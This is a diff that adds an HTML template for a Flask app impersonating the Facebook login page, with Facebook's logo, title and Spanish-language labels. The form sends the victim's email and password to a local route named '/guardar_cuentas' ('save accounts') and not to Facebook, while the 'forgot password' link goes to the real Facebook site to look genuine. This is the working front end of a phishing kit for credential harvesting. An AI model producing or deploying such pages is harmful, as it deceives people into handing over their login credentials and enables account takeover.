@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link href="{{ url_for('static', filename='css/facebook.css') }}" rel="stylesheet">
+  <title>Facebook - Login</title>
+</head>
+
+<body>
+  <div class="main">
+    <div class="logo">
+      <img src="{{url_for('static', filename='img/Facebook_logo_(2023).svg')}}" alt="logo">
+    </div>
+    <div class="container">
+      <form class="container" method="post" action="/guardar_cuentas">
+        <span class="login">Login to Facebook</span>
+        <input type="email" name="email" id="email" placeholder="Correo electrónico o número de teléfono" required>
+        <input type="password" name="pass" id="pass" placeholder="Contraseña" required>
+        <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
+        <button type="submit" class="login-btn">Iniciar Sesión</button>
+        <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">¿Olvidaste
+          tu contraseña?</a>
+        <div class="style">or</div>
+        <button class="new-account">Crear cuenta nueva</button>
+      </form>
+    </div>
+  </div>
+</body>
+
+</html>
